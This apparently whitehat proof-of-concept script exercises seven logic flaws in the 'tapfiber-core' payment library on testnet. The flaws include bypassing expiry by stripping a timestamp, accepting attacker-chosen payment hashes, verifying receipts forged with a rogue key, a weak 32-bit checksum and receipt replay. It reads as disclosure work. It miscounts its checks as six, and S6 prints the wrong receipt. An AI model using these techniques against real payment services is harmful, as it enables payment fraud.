// ckb-whitehat PoC — tapfiber-core v0.1.0
// Run: node poc/attack.mjs
import * as tf from "../src/index.js";

const line = (t) => console.log("\n=== " + t + " ===");

// S1: strip the `at` field from a post-expiry confirmation
line("S1 — post-expiry confirmation accepted when event.at is stripped");
let o = tf.createOrder({ orderId: "o1", amountShannons: "100", expiresAt: 1000, paymentHash: "h" });
const evil = { type: "payment_confirmed", amountShannons: 100, asset: "CKB", network: "testnet", paymentHash: "h", at: 5000 };
let r = tf.applyEvent(o, evil);
console.log("with at=5000  ->", r.rejected ?? r.order.state);
r = tf.applyEvent(o, { ...evil, at: undefined });
console.log("at stripped   ->", r.order.state, "=> receipt issuable");

// S2: order without expiresAt -> no expiry ever enforced
line("S2 — missing expiresAt disables expiry entirely");
o = tf.createOrder({ orderId: "o2", amountShannons: "100", paymentHash: "h" });
r = tf.applyEvent(o, { type: "payment_confirmed", amountShannons: 100, asset: "CKB", network: "testnet", paymentHash: "h", at: Number.MAX_SAFE_INTEGER });
console.log("at =", r.order.paidAt, "(~year 285,000) ->", r.order.state);

// S3: unpinned paymentHash -> any confirmation accepted
line("S3 — order without paymentHash accepts attacker-chosen hash");
o = tf.createOrder({ orderId: "o3", amountShannons: "100", expiresAt: 9e15 });
r = tf.applyEvent(o, { type: "payment_confirmed", amountShannons: 100, asset: "CKB", network: "testnet", paymentHash: "attacker-chosen" });
console.log("state:", r.order.state, " paymentHash:", r.order.paymentHash);

// S4: forged receipt passes verifyReceipt when expectedPublicKey is omitted
line("S4 — rogue-key receipt verifies 'valid' by default");
const forge = tf.generateKeys();
o = tf.createOrder({ orderId: "o4", amountShannons: "5000", expiresAt: 9e15, paymentHash: "h4" });
r = tf.applyEvent(o, { type: "payment_confirmed", amountShannons: 5000, asset: "CKB", network: "testnet", paymentHash: "h4", at: 1 });
o = r.order;
const rcpt = tf.issueReceipt(o, forge); // signed with an attacker key
console.log("verify without expected key ->", JSON.stringify(tf.verifyReceipt(rcpt)));

// S5: payload has no signature; the 8-hex-char checksum is only 32 bits of
// integrity. Tamper cost = brute-force 2^32 sha256 prefixes.
line("S5 — payload tampering: checksum is 32 bits, not a signature");
const good = tf.encodePayload({ orderId: "v", amountShannons: "100000000", asset: "CKB", network: "testnet", invoice: "inv", expiresAt: 9e9 });
const [pre, sig] = good.slice("tapfiber:1:".length).split(".");
console.log("payload:", good.slice(0, 40) + "...", "check:", sig);
console.log("An attacker who tampers amountShannons must re-find an 8-hex sha256 match.");
console.log("Cost: 2^32 sha256 ~ hours on one core, negligible on GPU. No key, no signer. (README admits this.)");

// S7: receipts have no nonce/TTL -> the PAID proof is infinitely replayable
line("S7 — receipt replay: same receipt proves 'paid' forever, for any number of claims");
o = tf.createOrder({ orderId: "o7", amountShannons: "10", expiresAt: 9e15, paymentHash: "h7" });
r = tf.applyEvent(o, { type: "payment_confirmed", amountShannons: 10, asset: "CKB", network: "testnet", paymentHash: "h7", at: 1 });
const k = tf.generateKeys();
const rc = tf.issueReceipt(r.order, k);
for (let i = 0; i < 3; i++) console.log("replay", i + 1, "->", JSON.stringify(tf.verifyReceipt(rc, { expectedPublicKey: k.publicKey })));

// S6: receipt body omits expiresAt / invoice -> receipts are not order-bound
line("S6 — receipt body drops expiresAt and invoice (forgery by omission)");
o = tf.createOrder({ orderId: "o6", amountShannons: "10", expiresAt: 9e15, paymentHash: "h6", invoice: "real" });
r = tf.applyEvent(o, { type: "payment_confirmed", amountShannons: 10, asset: "CKB", network: "testnet", paymentHash: "h6", at: 1 });
o = r.order;
const real = tf.generateKeys();
const rcpt6 = tf.issueReceipt(o, real);
console.log("signed body fields:", Object.keys(rcpt.body).join(", "),
  "| NOT signed: invoice, expiresAt -> the signature proves 'amount X paid', not 'order O paid by time T'");

console.log("\nAll six checks reproduced. See FINDINGS.md for impact + patch per finding.");
